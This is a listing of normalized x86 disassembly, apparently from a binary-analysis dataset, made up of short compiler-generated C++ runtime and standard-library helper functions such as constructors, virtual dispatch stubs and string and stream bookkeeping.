mov [ esi + 0x4 ] edx
mov eax esi
retn
j_sub_42587d
jmp sub_42587d
sub_402e49
mov eax r--data
retn
sub_402e4f
mov eax r--data
retn
sub_402e55
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402e70
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_402f12
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_446da6
pop ecx
pop ebp
retn 0x4
sub_402f22
mov [ ecx ] r--data
retn
sub_402f29
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_402f3e
mov ecx [ eax ]
mov [ esi ] ecx
call sub_402eaf
mov eax esi
retn
sub_402f4a
call sub_4470dc
mov [ esi ] eax
call sub_446e1d
mov ecx eax
call sub_402eaf
mov eax esi
retn
sub_402fbf
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
add eax 0x1c
retn
mov eax ecx
retn
sub_4030d2
call sub_402ffd
xor ecx ecx
test al al
sete al
retn
sub_4030ff
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_40310a
mov [ eax ] r--data
retn
sub_403131
mov ecx [ ecx + 0x10 ]
movzx eax al
test [ ecx + eax * 2 ] 0x48
push 0x0
pop eax
setne al
retn
sub_403169
push ebp
mov ebp esp
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
sub_403172
push ebp
mov ebp esp
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x10 ]
sub_40317b
push ebp
mov ebp esp
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x18 ]
sub_403184
and [ esi + 0x4 ] 0x0
push esi
mov [ esi ] r--data
call sub_40322d
mov eax esi
retn
sub_403217
push esi
mov esi ecx
mov [ esi ] r--data
call sub_403251
mov [ esi ] r--data
pop esi
retn
sub_403251
mov eax [ ecx + 0x14 ]
test eax eax
jle r-xdata
jns r-xdata
push [ ecx + 0x10 ]
call sub_42578a
pop ecx
retn
retn
push [ ecx + 0x10 ]
call sub_426081
pop ecx
sub_40326e
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_4473cc
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4032b1
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_447875
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4032f4
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_4032fe
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_4247f0
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0xc
sub_40331d
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_403327
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_4247f0
mov eax [ ebp + 0xc ]
add esp 0xc
pop ebp
retn 0x10
sub_403371
mov [ eax ] 0x1
mov [ eax + 0x4 ] ecx
retn
sub_40337b
call sub_4468bc
mov [ esi + 0x4 ] eax
mov [ esi ] 0x1
mov eax esi
retn
sub_4033b6
retn
j_sub_425354#8
jmp sub_425354
sub_403461
and [ ecx + 0xc ] 0x0
xor al al
je r-xdata
retn
push 0x0
call sub_4033fb
sub_403471
mov eax [ eax + 0xc ]
retn
sub_403475
xor eax eax
cmp [ ecx + 0xc ] eax
sete al
retn
sub_40347e
test [ eax + 0xc ] 0x6
push 0x0
pop eax
setne al
retn
sub_403489
mov eax [ eax + 0x14 ]
retn
sub_40348d
push ebp
mov ebp esp
mov eax [ ecx + 0x14 ]
mov edx eax
xor edx [ ebp + 0x8 ]
and edx 0xe00
xor edx eax
mov [ ecx + 0x14 ] edx
pop ebp
retn 0x4
sub_4034ff
push ecx
mov [ ecx ] r--data
call sub_446d07
pop ecx
retn
sub_40350d
mov [ eax ] r--data
retn
j_sub_425354#6
jmp sub_425354
sub_4035a7
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4035c2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_403613
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
and ecx 0xfffff3ff
or ecx 0x200
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_40362d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
and ecx 0xfffff9ff
or ecx 0x800
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_403647
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
and ecx 0xfffff5ff
or ecx 0x400
mov [ eax + 0x14 ] ecx
pop ebp
retn
j_sub_403cb6
jmp sub_403cb6
sub_403666
mov [ eax ] ecx
retn
sub_403669
mov [ eax ] ecx
retn
sub_40366c
mov [ eax ] ecx
retn
sub_40366f
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
or [ eax + 0x10 ] 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_4036a4
mov [ ecx ] r--data
retn
sub_40374a
retn
sub_40374b
xor ecx ecx
inc ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_40375b
mov [ ecx ] r--data
retn
sub_403762
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40376d
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
retn
sub_403800
and [ eax ] 0x0
retn
sub_403804
push esi
mov esi [ eax ]
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
sub_403812
mov ecx [ eax ]
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
retn
sub_40381f
mov edx [ eax ]
push esi
mov esi [ ecx ]
mov [ eax ] esi
mov [ ecx ] edx
pop esi
retn
sub_40382a
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_403832
mov eax [ eax ]
cmp eax [ ecx ]
sbb eax eax
neg eax
retn
sub_40383b
mov ecx [ eax ]
xor edx edx
add ecx 0x8
inc edx
[ ecx ] edx
retn
sub_403848
mov ecx [ eax ]
xor edx edx
add ecx 0x8
inc edx
[ ecx ] edx
retn
sub_403887
retn
sub_403888
mov [ eax ] ecx
retn
sub_40388b
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_4038b5
mov [ eax ] 0x3ffffffe
retn
sub_4038bc
mov eax [ eax ]
retn
sub_4038bf
xor eax eax
cmp [ ecx ] 0x3ffffffe
sete al
retn
sub_4038cb
retn
sub_4038cc
retn
sub_4038cd
and [ eax ] 0x0
retn
sub_4038d1
xor eax eax
inc eax
[ ecx ] eax
inc eax
retn
sub_4038da
or eax 0xffffffff
[ ecx ] eax
dec eax
retn
sub_4038e3
mov eax [ eax ]
retn
sub_4038e6
push ebp
mov ebp esp
and eax [ ebp + 0x8 ]
pop ebp
retn
sub_4038ee
push ebp
mov ebp esp
or eax [ ebp + 0x8 ]
pop ebp
retn
sub_4038f6
not eax
retn
sub_40393a
push esi
mov esi ecx
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_403685
mov ecx esi
pop esi
jmp sub_425354
sub_4039bc
retn
sub_4039bd
retn
sub_4039be
and [ eax ] 0x0
retn
sub_4039c2
mov [ eax ] 0x1
retn
sub_4039c9
and [ eax ] 0x0
retn
sub_4039cd
and [ eax ] 0x0
retn
sub_4039d1
mov [ eax ] ecx
retn
sub_4039d4
mov [ eax ] ecx
retn
sub_4039d7
mov [ eax ] ecx
retn
sub_403a28
mov eax [ eax ]
test eax eax
je r-xdata
retn
jmp sub_40619e
sub_403a34
mov eax [ eax ]
test eax eax
je r-xdata
retn
jmp sub_40619e
sub_403a40
mov eax [ eax ]
test eax eax
je r-xdata
retn
jmp sub_40619e
sub_403a4c
mov eax [ eax ]
test eax eax
je r-xdata
retn
jmp sub_40619e
sub_403a58
call sub_403a0c
xor eax eax
retn
sub_403a60
and [ eax + 0x10 ] 0x0
mov [ eax + 0x14 ] 0xf
mov [ eax ] 0x0
retn
sub_403a92
push edi
mov edi eax
and [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0xf
mov [ edi ] 0x0
call sub_404744
mov eax edi
pop edi
retn
sub_403aac
push 0x0
push 0x1
call sub_40487c
retn
sub_403ab6
and [ eax + 0x10 ] 0x0
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov [ eax ] 0x0
retn
mov eax [ eax ]
sub_403ac6
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_403af5
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_403afe
mov eax [ ecx + 0x10 ]
retn
sub_403b18
mov eax [ edx + 0x10 ]
push 0x1
push r--data
call sub_404814
retn
sub_403b28
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
sub_403b30
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
push eax
call sub_42578a
pop ecx
sub_403b45
mov ecx [ eax ]
test ecx ecx
je r-xdata
add eax 0x4
retn
mov eax ecx
retn
sub_403b52
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_403bb5
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
push 0x1
or eax 0x4
call sub_404912
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
sub_403c47
push ecx
mov [ ecx ] r--data
call sub_446d07
pop ecx
retn
sub_403c55
push ebp
mov ebp esp
mov eax [ ecx + 0xc ]
push [ ebp + 0xc ]
or eax [ ebp + 0x8 ]
call sub_404912
pop ebp
retn 0x8
sub_403c6a
mov eax [ eax + 0x38 ]
retn
sub_403c6e
mov eax [ ecx - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x10 ] r--data
retn
sub_403cac
xor eax eax
cmp [ ecx + 0x4 ] al
setne al
dec eax
retn
sub_403cb6
mov eax [ eax ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x8 ]
sub_403d50
add ecx 0x4
jmp sub_44735a
sub_403d58
add ecx 0x4
jmp sub_447363
sub_403d60
or eax 0xffffffff
retn 0x4
sub_403d66
or eax 0xffffffff
retn 0x4
sub_403d6c
xor eax eax
xor edx edx
retn
sub_403d71
or eax 0xffffffff
retn
sub_403f92
mov eax ecx
retn 0xc
sub_403f97
xor eax eax
retn
sub_403f9a
retn 0x4
sub_403f9d
and [ eax ] 0x0
retn
sub_403fa1
mov ecx [ esi ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi ] 0x0
sub_403fb4
mov ecx [ eax ]
mov [ esi ] ecx
test ecx ecx
je r-xdata
mov eax esi
retn
mov eax [ ecx ]
call [ eax + 0xc ]
sub_403fc4
push esi
push edi
mov edi [ eax ]
mov esi ecx
call sub_403fd4
pop edi
mov eax esi
pop esi
retn
sub_40458f
mov eax [ eax ]
test eax eax
je r-xdata
retn
jmp sub_40619e
sub_404663
add ecx 0x200
jmp sub_402f60
sub_4046b6
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add eax 0x8
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_446d07
pop ecx
retn
sub_4046d4
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add eax 0x10
mov [ ecx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_446d07
pop ecx
retn
sub_4046f2
add ecx 0x200
jmp sub_402f60
sub_4046fd
add ecx 0x200
jmp sub_402f60
sub_404708
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
sub_404717
push ebp
mov ebp esp
pop ebp
jmp sub_404dc3
sub_40478e
push ebp
mov ebp esp
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
call sub_404e0f
pop ebp
retn 0x4
sub_404800
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ecx + 0x10 ]
add ecx edx
mov [ eax ] ecx
retn
sub_404863
push ebp
mov ebp esp
cmp [ ecx + 0x14 ] 0x10
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x10 ] eax
jb r-xdata
mov [ ecx + eax ] 0x0
pop ebp
retn 0x4
mov ecx [ ecx ]
sub_4048c0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
retn
mov eax [ ecx ]
retn
sub_4048cc
mov eax ecx
retn 0x4
sub_4048d1
retn
sub_4048d2
mov eax ecx
retn
sub_4048d5
mov eax ecx
retn 0x4
sub_4048da
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x8
sub_4048ea
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_405e71
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4048fd
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
push eax
call sub_42578a
pop ecx
sub_404937
mov [ eax ] r--data
retn
sub_4049f2
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
push 0x1
or eax 0x4
call sub_404912
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_404a3e
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x38 ]
test eax eax
je r-xdata
mov eax esi
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
sub_404a57
mov eax [ ecx ]
jmp [ eax + 0x34 ]
sub_404abf
mov eax [ eax + 0x10 ]
mov eax [ eax ]
retn
sub_404ac5
mov eax [ eax + 0x20 ]
mov eax [ eax ]
retn
sub_404acb
mov eax [ eax + 0x14 ]
mov eax [ eax ]
retn
sub_404ad1
mov eax [ eax + 0x24 ]
mov eax [ eax ]
retn
sub_404ad7
mov ecx [ eax + 0x30 ]
mov edx [ eax + 0x20 ]
mov eax [ ecx ]
add eax [ edx ]
retn
sub_404ae2
mov eax [ edx + 0x30 ]
sub [ eax ] ecx
mov eax [ edx + 0x20 ]
add [ eax ] ecx
retn
sub_404aed
push esi
mov esi [ ecx + 0x10 ]
mov [ esi ] edi
mov esi [ ecx + 0x20 ]
mov [ esi ] edx
mov ecx [ ecx + 0x30 ]
sub eax edx
mov [ ecx ] eax
pop esi
retn
sub_404b01
mov ecx [ eax + 0x34 ]
mov edx [ eax + 0x24 ]
mov eax [ ecx ]
add eax [ edx ]
retn
sub_404b0c
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
retn
sub_404b1c
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
inc eax
mov [ ecx ] eax
retn
sub_404b2a
mov ecx [ eax + 0x20 ]
cmp [ ecx ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov eax [ eax + 0x30 ]
mov eax [ eax ]
cdq
retn
sub_404b3d
mov eax [ edx + 0x34 ]
sub [ eax ] ecx
mov eax [ edx + 0x24 ]
add [ eax ] ecx
retn
sub_404b48
push esi
mov esi [ ecx + 0x14 ]
mov [ esi ] edx
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
pop esi
retn
sub_404b5c
push esi
mov esi [ ecx + 0x14 ]
mov [ esi ] edi
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
pop esi
retn
sub_404b70
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
retn
sub_404b80
mov ecx [ eax + 0x24 ]
cmp [ ecx ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov eax [ eax + 0x34 ]
mov eax [ eax ]
cdq
retn
sub_404b93
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
jmp [ eax + 0xc ]
sub_404b9f
mov ecx [ esi ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi ] 0x0
sub_404bb2
push 0x0
mov eax sub_44b61a
call sub_448595
mov esi [ ebp + 0x8 ]
push esi
call sub_40504d
and [ esi + 0x3c ] 0x0
and [ esi + 0x40 ] 0x0
mov [ esi ] r--data
mov eax esi
call sub_44866d
retn 0x4
sub_404c9f
xor eax eax
cmp [ ecx + 0x4 ] al
setne al
dec eax
retn
sub_404ca9
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x8
sub_404cc6
mov eax [ ecx + 0x8 ]
cdq
add eax [ ecx ]
adc edx [ ecx + 0x4 ]
retn
sub_404dfc
push ebp
mov ebp esp
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
call sub_404e0f
pop ebp
retn 0x4
sub_404fae
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ eax ] ecx
retn
mov ecx [ ecx ]
sub_404fb9
retn
sub_404fba
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
sub eax [ ebp + 0xc ]
pop ebp
retn
pop ebp
retn
sub_404fcb
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
retn
mov eax [ ecx ]
retn
sub_404fd7
push r--data
call sub_446ae2
sub_404fe2
push 0x4
mov eax sub_44d889
call sub_4485c8
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0x14 ] 0x2
je r-xdata
call sub_44866d
retn
call sub_403c0a
sub_40500b
mov eax r-xdata
retn
sub_405011
mov eax [ eax + 0x3c ]
retn
sub_405117
xor eax eax
retn
sub_405165
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_40516d
mov [ eax ] ecx
retn
sub_405170
push ebp
mov ebp esp
mov ecx [ ecx ]
add ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_40517e
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x38 ]
test eax eax
je r-xdata
mov eax esi
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
sub_405197
mov eax [ eax ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x8 ]
sub_405233
push [ eax + 0x4 ]
call sub_424fc7
pop ecx
retn
sub_40523d
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_405254
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40526b
push esi
mov esi ecx
mov [ esi ] r--data
call sub_405699
mov [ esi ] r--data
pop esi
retn
sub_405281
mov al [ ecx + 0xc ]
retn
sub_405285
mov al [ ecx + 0xd ]
retn
sub_405289
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_403a6f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_4052a3
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_403a6f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_4052bd
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_403a6f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_4052d7
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
mov ebx eax
call sub_405317
mov eax ebx
pop ebx
pop ebp
retn 0x4
sub_40541f
cmp [ eax + 0x14 ] 0x10
jb r-xdata
add eax ecx
retn
mov eax [ eax ]
sub_4054fd
push r--data
call sub_446a95
sub_40558b
mov [ eax ] ecx
retn
sub_40558e
mov eax [ eax ]
sub eax [ ecx ]
retn
sub_4055ee
add [ eax ] ecx
retn
sub_4055f1
retn
sub_40560a
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_405612
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_405667
retn
sub_405668
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_405678
mov eax [ ecx ]
jmp [ eax + 0x4 ]
sub_405682
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_405699
push [ esi + 0x8 ]
call sub_426081
push [ esi + 0x10 ]
call sub_426081
push [ esi + 0x14 ]
call sub_426081
add esp 0xc
retn
sub_40573b
push 0xfffffffe
pop eax
retn
sub_405818
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_40487c
push esi
push esi
call sub_426f77
int3
sub_405b7c
mov eax [ eax + 0x4 ]
retn
sub_405bb0
retn
sub_405bb1
mov [ eax ] ecx
retn
sub_405bb4
mov ecx [ eax ]
mov [ esi ] ecx
call sub_405d05
mov eax esi
retn
sub_405bc0
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_405bca
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_405bd4
or eax 0xffffffff
retn
sub_405c59
mov eax [ eax + 0x4 ]
add eax 0x8
retn
sub_405c60
mov eax [ eax + 0x4 ]
add eax 0x4
retn
sub_405cac
add eax 0x2c
retn
sub_405cb0
add eax 0x2d
retn
sub_405cb4
retn
sub_405cb5
add eax 0x4
retn
sub_405cb9
add eax 0x8
retn
sub_405cbd
add eax 0xc
retn
sub_405cc1
jmp r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2d ] 0x0
je r-xdata
mov eax ecx
retn
sub_405ccf
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2d ] 0x0
je r-xdata
mov eax ecx
retn
sub_405cdc
retn 0x4
sub_405cdf
xor eax eax
inc eax
jmp sub_405ff7
sub_405ce7
mov [ eax ] ecx
retn
sub_405cea
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_405d05
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_405cfc
mov eax [ eax ]
retn
sub_405cff
retn 0x4
sub_405d02
mov [ eax ] ecx
retn
sub_405dd7
mov ecx [ ecx ]
mov [ eax + 0x14 ] ecx
retn
sub_405ddd
mov ecx [ ecx ]
mov [ eax + 0x18 ] ecx
retn
sub_405de3
mov ecx [ ecx ]
mov [ eax + 0x1c ] ecx
retn
sub_405fc2
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_406630
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_405fdc
retn
sub_405fdd
mov dl [ ecx ]
push ebx
mov bl [ eax ]
mov [ ecx ] bl
mov [ eax ] dl
pop ebx
retn
sub_405fe8
retn
sub_405fe9
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_406a4d
pop ebp
retn
sub_405ff6
retn
sub_406072
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_40607d
push esi
mov esi ecx
call sub_40626a
mov [ esi + 0x2c ] r--data
pop esi
retn
sub_40614e
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40618f
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x18 ]
sub_4061e7
push ebp
mov ebp esp
pop ebp
jmp sub_406a4d
sub_40626a
mov eax [ ecx + 0x24 ]
mov [ ecx ] r--data
mov [ ecx + 0xc ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x24 ] r--data
mov eax [ ecx + 0x24 ]
mov eax [ eax + 0x4 ]
lea edx [ eax - 0x8 ]
mov [ eax + ecx + 0x20 ] edx
jmp sub_40393a
sub_40632c
and [ eax ] 0x0
push esi
mov esi [ eax + 0x4 ]
and [ eax + 0x4 ] 0x0
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
sub_406342
push 0x0
mov eax sub_449f70
call sub_448595
mov esi [ ebp + 0x8 ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push esi
mov [ esi ] r--data
call sub_40645a
mov eax esi
call sub_44866d
retn 0x4
sub_4063ed
mov [ eax ] r--data
retn
sub_406431
mov eax [ eax + 0x4 ]
retn
sub_406435
mov eax [ eax + 0x4 ]
add eax 0x8
retn
sub_40643c
mov eax [ eax + 0x4 ]
add eax 0x4
retn
sub_406443
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
mov esi [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] esi
mov [ ecx + 0x4 ] edx
pop esi
retn
sub_4064e7
mov esi [ ebp + 0x8 ]
call sub_405699
xor eax eax
push eax
push eax
call sub_426f77
int3
sub_40650a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_40651a
mov ecx [ ecx ]
mov [ eax + 0x14 ] ecx
retn
sub_406520
mov ecx [ ecx ]
mov [ eax + 0x18 ] ecx
retn
sub_406526
mov ecx [ ecx ]
mov [ eax + 0x1c ] ecx
retn
sub_40652c
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_4060fc
mov eax [ ebp + 0x8 ]
leave
retn
sub_406544
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_406c48
mov eax [ ebp + 0x8 ]
leave
retn
sub_406559
retn
sub_40698c
retn
sub_40698d
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_406a4d
pop ebp
retn
sub_40699a
retn
sub_40699b
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
sub_4069aa
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_4069e3
retn
sub_406a21
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_406a4d
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_406a33
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_406a44
push ebp
mov ebp esp
pop ebp
jmp sub_406a4d
sub_406a83
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
sub_406a96
push 0x4
mov eax sub_44e18a
call sub_448595
mov ebx [ ebp + 0x8 ]
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_407bf1
mov eax ebx
call sub_44866d
retn 0x8
sub_406abe
push ebx
mov ebx eax
call sub_40700b
call sub_407047
pop ebx
retn
sub_406acd
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
call sub_40379c
sub_406b0f
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0x286
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_406b4d
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_406b81
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x210 ] ecx
retn
sub_406b8f
mov [ eax + 0x208 ] ecx
retn
sub_406cc6
push ebp
